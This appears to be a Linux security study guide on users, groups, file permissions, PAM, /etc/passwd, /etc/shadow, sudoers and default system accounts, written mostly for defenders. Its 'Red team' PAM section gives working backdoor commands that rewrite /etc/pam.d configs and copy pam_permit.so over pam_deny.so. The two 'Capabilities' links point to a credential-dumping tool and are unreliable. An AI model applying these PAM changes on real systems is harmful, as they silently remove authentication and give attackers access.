# Table of Contents

- [Table of Contents](#table-of-contents)
- [Users and Groups](#users-and-groups)
  - [Users](#users)
    - [User group modifications](#user-group-modifications)
    - [User name change](#user-name-change)
    - [User shell change](#user-shell-change)
  - [Groups](#groups)
- [Permissions](#permissions)
  - [File Permissions](#file-permissions)
    - [SUID + GUID bit](#suid--guid-bit)
  - [File Attributes](#file-attributes)
  - [ACLs (Access Control Lists)](#acls-access-control-lists)
  - [Capabilities](#capabilities)
  - [Mandatory Access Control](#mandatory-access-control)
  - [PAM](#pam)
    - [:red\_circle: Red team :red\_circle:](#red_circle-red-team-red_circle)
- [Important Files](#important-files)
  - [`/etc/passwd`](#etcpasswd)
  - [`/etc/shadow`](#etcshadow)
    - [Format:](#format)
    - [Hash Types](#hash-types)
  - [`/etc/group`](#etcgroup)
  - [`/etc/gshadow`](#etcgshadow)
  - [`/etc/sudoers`](#etcsudoers)
  - [`.bashrc` + `.bash_profile`](#bashrc--bash_profile)
- [List of users](#list-of-users)
  - [Required Users](#required-users)
  - [Optional Users](#optional-users)

# Users and Groups
## Users
* `adduser [USER]` - preferred way to add a user
  * non-standard command, it uses `useradd` in the background; or it may just be symlinked to `useradd` too
  * automatically creates a home directory; asks for a new password
  * asks for Full Name, Room Number, Phone Numbers
  * leaves home directory blank
  * has well-documented options for modifying its default behavior, which is very useful
  * Debian man pages recommend using `adduser` over `useradd`
* `useradd`
  * built-in, very low-definition
  * Quirks for the default behavior:
    * the entry created in `/etc/passwd` does contain the `x`, but since this command did not set a password, we would not be able to enter the new user account. Also, 
    * the entry does contain `/home/<user>` for the new user, even though this address does not exist either. Even if we set a password with passwd for the *test* user, we would still be unable to create the home directory
    * the default login shell is `sh`, not `bash`
  * Can be fixed by modifying `/etc/login.defs`
* `userdel [USER]`
  * `userdel -r [USER]` to remove the home directory for bob
* `/etc/sudoers` contains user privilege specifications, and the permissions for different groups
  * `sudo visudo` to edit this file, NEVER interact with this file directly
* `usermod [FLAGS] [USER]`
  * general modifications for a user; requires logout (restart in some cases) for changes to take effect
### User group modifications
  * `-a`: append (add) a group to the user
  * `-G [GROUP]`: the name of the group we want to add
  * `sudo gpasswd -d username groupname`

**Example**
* `sudo usermod -aG sudo` - add the `sudo` group to the list of `bob`'s groups

### User name change
  * `--login|-l [NEW_LOGIN]`: new value of the login name
  * `sudo usermod -l [NEW_USERNAME] [OLD_USERNAME]`
### User shell change
* `sudo usermod --shell [SHELL] [USER]`
## Groups
* `groups`
  * shows the groups the current user is a member of
  * `groups [USER]` to show groups of a specific user
* `id`
  * get the groups and their id's; shows `gid` of a user
* `/etc/group` - contains list of groups, GID's, and member accounts
  * `[GROUP]:x:[GID]:[MEMBER_USERS]`
* `chown [USER]:[GROUP] [FILE]`

# Permissions
Security is built around the principle of least privileges... this is how the OS maintains that.

## File Permissions
[This blog](https://tbhaxor.com/linux-file-permissions/) explains Linux file permissions really well. Running `ls -l` will display those permissions.

- This `ls` option will list the permissions of a file. Should normally pair this with the `-a` option to show hidden files as well (files with a . at the start of their name)

Example of an `ls -la` entry that I ran in my home directory:
```
-rwxr-xr-x  br br    126 KB Wed Dec 15 10:28:22 2021 my_sick_program.o*
```

* Note the first 10 characters of this command (`.rwxr-xr-x`)
* The first `-` indicates that this listing is _not_ a directory (it would show `d` otherwise)
* The next three characters (`rwx`) indicate that it is readable, writeable, and executable by the file owner -- `br` (my user)
* The three characters after (`r-x`) indicate that it is readable, _not_ writeable, and executable by the group associated with the file
* The last three characters (`r-x`) indicate the same thing as before, but these apply to "everyone else" (that is not the owner or group for the file)

* You can modify permissions with `chmod`; for the following examples, suppose the permissions for a file are the following `---------`
  * `chmod +x <file>` results in `-x--x--x-`
  * `chmod u+x file` results in `-x-------`
    * similary, change the `u` to `a` (for other users) or `g` (for group perms)
* you can modify permissions numerically as well
  * r = 4, w = 2, x = 1
  * `chmod 644 file` results in `rw-r--r--`
  * `chmod 777 file` results in `rwxrwxrwx`

### SUID + GUID bit
There is a secret 4th bit that modifies the `x` bit. Depending on which group it's in, it means something different:
- user --> **s** = SUID. The binary is always executed with the privileges of the owner. 
- group --> **s** = GUID. The binary is executed with the privileges of the owner group.
- other --> **t** = sticky bit. Basically only the owner can delete the file.
   - Note: The **uppercase** version of these letters means the same thing, except the file is **NOT** executable.

For files with the sticky bit, check [GTFOBins](https://gtfobins.github.io/) if it is exploitable ([LOLBAS](https://lolbas-project.github.io/#) is the Windows equivalent). To understand this bit better, you can read more [here](https://tbhaxor.com/demystifying-suid-and-sgid-bits/).

## File Attributes
* extended attributes (metadata) describing how files behave (similar to permissions in a way)
* `lsattr` - list attributes
* `chattr` - change attributes
  * more common one we've used is `chattr +i <file>`: make a file immutable, not even root can delete it
  * remove this attribute with `chattr -i <file>`
* [Read more here](https://wiki.archlinux.org/title/File_permissions_and_attributes#File_attributes)

## ACLs (Access Control Lists)
**Access control lists** (acls) are an *additional* set of *user-specific* permissions that you can assign to files. These don't appear normally in `ls -l` (you may see a `+`), so instead use `getfacl`.

## Capabilities
Capabilities are another set of permissions you assign to *processes*. Root can do a LOT of things, so to follow the principle of least privilege, Linux has grouped root's privileges into **capabilties**. This can be confusing, so here is a [detailed guide](https://github.com/huntergregal/mimipenguin/tree/master) and [practical overview](https://github.com/huntergregal/mimipenguin/tree/master).

## Mandatory Access Control
There's a bunch of theory and models on the different types of access control, which you can learn about [here](https://pwn.college/intro-to-cybersecurity/access-control/).

## PAM
Pluggable (more like *Painful*) Authentication Modules are a source of plenty of confusion and many backdoors. Essentially, whenever any authentication happens in Linux, PAM is what handles it. If you want to learn it thoroughly, [this guide](https://www.chiark.greenend.org.uk/doc/libpam-doc/html/Linux-PAM_SAG.html) and [video](https://www.youtube.com/watch?v=eHGzzCtJg0A) are GREAT! I will provide a *brief* summary.

PAM handles authentication in Linux and consists of config files in `/etc/pam.d`, which reference so files in `/lib/x86_64-linux-gnu/security/`. If you want to find the standard config for your distroy, you can look at its [CIS benchmark](https://www.cisecurity.org/cis-benchmarks). The most relevant config files are (with examples):

- `password-auth` (RHEL-based) and `common-auth` (Debian-based): handles authentication stuff
<details>
  <summary>Click here to see an example config</summary>
  <pre><code>password  [success=1 default=ignore] pam_unix.so  obscure yescrypt
password  requisite  pam_deny.so
password  required  pam_permit.so </code></pre>
</details>

- `su`  handles who can su
<details>
  <summary>Click here to see an example config</summary>
  <pre><code># If you want root to su w/o passwd then it should begin with
auth  sufficient  pam_rootok.so </code></pre>
</details>

- `common-password` for changing passwords
<details>
  <summary>Click here to see an example config</summary>
  <pre><code># Optional line if you're enforcing passwd policy
password  requisite  pam_pwquality.so  retry=3 minlen=12 difok=3
# If succeeds, skip next line (so jumps to permit). The yescrypt is secure hashing algorithm
password  [success=1 default=ignore]  pam_unix.so  obscure  yescrypt
password  requisite  pam_deny.so
password  required  pam_permit.so </code></pre>
</details>

Each line in these config files will consist of ... <br>
**an interface:**

- `auth`: authentication
- `account`: authorization (expired, time of day)
- `password`: changing passwd
- `session`: other stuff during login/logout

**a flag:**

- `required` must succeed.
- `requisite` must succeed and notifies immediately of first fail
- `sufficient` if succeeds (and no previous fails), then you pass
- `optional` only necessarry if there are no other modules
- `include`

| Flag | Description | :x: | :x: | :white_check_mark: | :white_check_mark: |
|----------|----------|----------|----------|----------|----------|
| required | Must succeed  | :x: | :white_check_mark: | :white_check_mark: | :white_check_mark: |
| requisite | Must succeed. Terminates early on fail. | :white_check_mark: | :x: | :white_check_mark: | :white_check_mark: |
| optional | Doesn't matter, mainly logging | :x: | | :x: | :white_check_mark: |
| sufficient | If pass, terminates early | :white_check_mark: |  |  :white_check_mark: | :x: |
requisite |   |  |  |  | :white_check_mark: |

**and a module:**

- `pam_console.so`: checks for `/etc/security/console.apps` file
- `pam_cracklib.so`: checks new passwds against dictionary attack
    - `retry=#` number of retries allowed- `pam_permit.so`: allows login
- `pam_deny.so`: denies login
- `pam_nologin.so`: fails if `/etc/nologin` exists and uid != 0
- `pam_rootok.so`: checks if uid=0
- `pam_securetty.so`: if logging in as root, check if tty is in `/etc/securetty`
- `pam_unix.so`: prompts and compares password to `/etc/shadow`
  - `nullok`: allows blank passwd
  - `shadow`: when updating passwd, stores in `/etc/shadow`

### :red_circle: Red team :red_circle:

There are many ways that PAM can be backdoored

<details>
  <summary>Modify the config files in <code>/etc/pam.d/</code> </summary>
  <pre><code>sed -ie "s/nullok_secure/nullok/g" /etc/pam.d/password-auth
sed -ie "s/try_first_pass//g" /etc/pam.d/password-auth
sed -ie "s/nullok_secure/nullok/g" /etc/pam.d/common-auth
sed -ie "s/pam_rootok.so/pam_permit.so/g" /etc/pam.d/common-auth
sed -ie "s/pam_rootok.so/pam_permit.so/g" /etc/pam.d/su
sed -ie "s/pam_deny.so/pam_permit.so/g" /etc/pam.d/common-auth</code></pre>
</details>

<details>
  <summary>Replace the binaries in <code>/lib/x86_64-linux-gnu/security/</code></summary>
  This could be as simple as copying one file to another
  <pre><code>if [ -f "/lib/x86_64-linux-gnu/security/pam_permit.so" ]
then pam_path="/lib/x86_64-linux-gnu/security"
else pam_path="/lib/i386-linux-gnu/security"
fi
cp -f $pam_path/pam_permit.so $pam_path/pam_deny.so</code></pre>

  Or something as advanced as modifying the <a href="https://github.com/linux-pam/linux-pam/tree/master/modules">source code</a> and recompiling:
</details>

# Important Files

## `/etc/passwd`

This file controls the properties of all users on your system. Read [this blog](https://tbhaxor.com/linux-file-permissions/#how-linux-match-password-and-perform-login) to understand how this file is formatted.

Some things to look for:
- **uid = 0** (so the user is functionally root)
- Most users have their shell as `/bin/false` or `/usr/sbin/nologin`. If it is not one of these (or the bin has been replaced), then that means an attacker can login as that user which should NOT be happening.
- passwds should **NOT** be stored in this file
- if the passwd field is **blank**, then a user can **login w/o a passwd**! Additionally, if you set a passwd for that user, it is stored in /etc/passwd instead of /etc/shadow

## `/etc/shadow`

This file stores the password hashes. Read [this blog](https://tbhaxor.com/linux-file-permissions/#how-linux-match-password-and-perform-login) to understand how this file is formatted. Make sure this file is only readable by root.

- `*` (Debian-based) or `!!` (RHEL-based) means a passwd has never been set while `!` means the account is locked. Either way, the user can't login
- should not be edited directly (unless you what you're doing); 
  * change user password using `passwd`
  * change password aging information with `chage`

### Format:
  * `[USER]:[HASH]:[LAST_PASSWORD_CHANGE]:[MIN_PASSWORD_AGE]:[MAX_PASSWORD_AGE]:[WARNING_PERIOD]:[INACTIVITY_PERIOD]:[EXPIRATION_DATE]:[UNUSED]`
  * `USER` - user account
  * `HASH` - hash that uses the format `$type$salt$hash`
    * if the password field contains `*` or `!`, the user cannot login using password authentication; key-based authentication, or switching to the user is still allowed
  * `LAST_PASSWORD_CHANGE` - last password change in days, counting from epoch date (Jan 1, 1970)
  * `MIN_PASSWORD_AGE` - days that must pass before user password can be changed; 0 means no minimum password age
  * `MAX_PASSWORD_AGE` - days password must be changed; 99999 by default
  * `WARNING_PERIOD` - days before password expires during which the user is warned to change password
  * `INACTIVITY_PERIOD` - days after the user password expires before the user account is disabled; empty by default
  * `EXPIRATION_DATE` - date when the account was disabled, epoch date. 
  * `UNUSED` - field is ignored, reserved for future use

### Hash Types
* `$1$` means an MD5 hash; very insecure
* `$6$` means a SHA-512 is being used
* `$y$` means a yescrypt, very good

## `/etc/group`

This file lists the users in each group. This is referenced when checking group permissions for things like file access. Some groups can be used for **privesc** and should be checked carefully. 

- **sudo** (Debian-based) and **wheel** (RHEL-based) are important, as well as `adm`, `docker`, and `dialout`

You'll notice that the passwd field in this file also has `x`, which indicates a corresponding shadow file...

## `/etc/gshadow`

This file contains the passwds for groups. This allows users to add themselves to a group using `newgrp` if they provide the passwd. If a user is listed under that group, they don't need the passwd to add themselves to that group. This should never be enabled, so all passwd should be `!`

## `/etc/sudoers`

Sudo is a command that allows certain users to execute as root. You need to check `/etc/sudoers` and all files in `/etc/sudoers.d/` to ensure there are no misconfigurations. Read [this blog](https://tbhaxor.com/understand-sudo-in-linux/#understand-sudoers-file-format) to understand how it's formatted.

Edit this file through `visudo`. Don't edit directly through a privileged text editor, you might break/brick or you system. `visudo` is meant to be the safe way to edit the file.

Example:
* `%admin ALL=(ALL) NOPASSWD: ALL`
  * `group|user hosts=(<runas_user>:<target_group>) tag_list: <list_target_commands>`
  * users in the admin group may run any command as any user without a password

Available tag_list values are:
|Tag|Meaning|
|:-|:-|
|**NOPASSWD**|The user **won’t be prompted** for their password before running the command.|
|**PASSWD**|The user **will be prompted** for their password before running the command (overrides `NOPASSWD`).|
|**NOEXEC**|Prevents the command from executing further commands (via exec). Useful for security (e.g., `vi`, `less`).|
|**EXEC**|Overrides `NOEXEC`; allows the command to run other programs.|
|**SETENV**|Allows the command to **run with user-specified environment variables** (e.g., with `sudo -E`).|
|**NOSETENV**|Prevents the use of `SETENV` (the default if unspecified).|
|**LOG_INPUT**|Enables **logging of all input** provided to the command.|
|**NOLOG_INPUT**|Disables input logging.|
|**LOG_OUTPUT**|Enables **logging of all output** of the command.|
|**NOLOG_OUTPUT**|Disables output logging.|


## `.bashrc` + `.bash_profile`

Every time a new shell is started **any commands in these files are run**.

- `.bash_profile` are for login shells
- `.bashrc` are for non-login shells
- You'll often see `source ~/.bashrc` inside of `bash_profile`, so that all of those commands are also applied in login

Thus, attackers could backdoor commands with `alias` or run arbitrary commands (like passwd)

# List of users

This is a compilation of default users that typically show up on machines (so you know who's legit and who isn't).

## Required Users

These users are used to help run the system and should not be tampered with:
```
User                 Purpose
---------------------------------------------------------
adm                  Legacy user for wtmp and pacct files. Doesn't run processes but still important for access control
_apt                 Debian --> security measure for installing packages
bin                  Owns files in /bin and /usr/bin. Should not be running process
daemon               Runs background processes (e.g. syslog or cups)
dbus                 Runs dbus-daemon for the message bus
dhcpd                Obtains network config info via DHCP
kernoops             Reports kernel oops messages (non-fatal errors)
nobody               Generic user account for minimum privileges (e.g. NFS server)
operator             handles OS stuff, like backups + maintenance. Kept for historical compatability
root                 Sudo
_rpc                 Supports remote procedure calls, for services like NFS
shutdown             Handles graceful shutdowns/reboots.
sync                 Runs sync command, which flushes buffers to disk for data integrity
sys                  Owns system files and runs generic priveledged processes
systemd-bus-proxy    systemd proxy for the D-bus
systemd-coredump     systemd provides crash dumps
systemd-journal-remote  systemd journal can securely send/receive logs to remote server
systemd-network      Manages network interface + configuration
systemd-oom          terminates processes/groups before a kernel out-of-memory event happens
systemd-resolve      systemd-resolved for name resolution (DNS, LLMNR, mDNS)
systemd-timesync     systemd-timesyncd synchronizes with NTP
systemd-updates      marks system resources as updated
tty                  owns terminal devices. Rarely used in processes, but still handles permissions
whoopsie             Ubuntu crash reports
```

## Optional Users

These users are used for services. Whether they are necessarry or not depends on what services are running on your system
These users are used to help run the system and should not be tampered with:
```
User                 Service            
-----------------------------------------
apache               web server
at                   job scheduling
auditdistd           security auditing
avahi                mDNS (Zeroconf)
avahi-autoipd        mDNS (Zeroconf)
backup               system backup
bind                 DNS server
_chrony              time synchronization
chrony               time synchronization
clamav               antivirus
cockpit-ws           Web-based admin UI for Linux
cockpit-wsinstance   Web-based admin UI for Linux
colord               color management
cron                 scheduled jobs
cups                 Printing services
cups-browsed         Printing services
cups-pk-helper       Printing services
cyrus                email
Debian-exim          mail
Debian-gdm           GUI login
gdm                  GUI login
lightdm              GUI login
mdm                  GUI login
_dhcp                DHCP
dhcpd                DHCP
dnsmasq              Lightweight DNS/DHCP
_flatpak             Flatpak apps
ftp                  FTP user
fwupd-refresh        Firmware update service
games                Legacy user for game scores
geoclue              Location
git                  Git version control
git_daemon           Git version control
gnats                Bug reporting
gnome-initial-setup  GNOME initial setup
hplip                HP printer drivers
http                 Web servers
lighttpd             Web servers
nginx                Web servers
insights             RHEL security
irc                  Real-time chat
landscape            Canonical’s system management
ldap                 LDAP
libstoragemgmt       Storage management
list                 email
lp                   printing
lxd                  Linux containers
mail                 mail spool
messagebus           D-Bus
mpd                  Music Player
mysql                MySQL
named                DNS
news                 Usenet news
nm-openconnect       VPN
nm-openvpn           VPN
nscd                 Name service caching daemon
ntp                  Time sync
_pflogd              pfSense logs
polkitd              PolicyKit (GUI)
postgres             PostgreSQL
postmaster           PostgreSQL
proxy                proxys
pulse                PulseAudio
redis                in-memory database
rtkit                PulseAudio scheduler
sambadaemon          Samba (Windows file sharing)
saned                Scanner
setroubleshoot       SELinux
smmsp                Mail
speech-dispatcher    Text-to-speech
squid                Proxy
sshd                 SSH
sssd                 LDAP, Kerberos
strongswan           VPN
syslog               Logging
tcpdump              Pcap
tss                  TPM security
unbound              DNS resolver
usbmux               iOS USB
uucp                 Legacy user for remote file transfer/mail
uuidd                Generates unique identifiers.
vboxadd              Virtual machines
www-data             web
www                  web
xfs                  XFS filesystem
```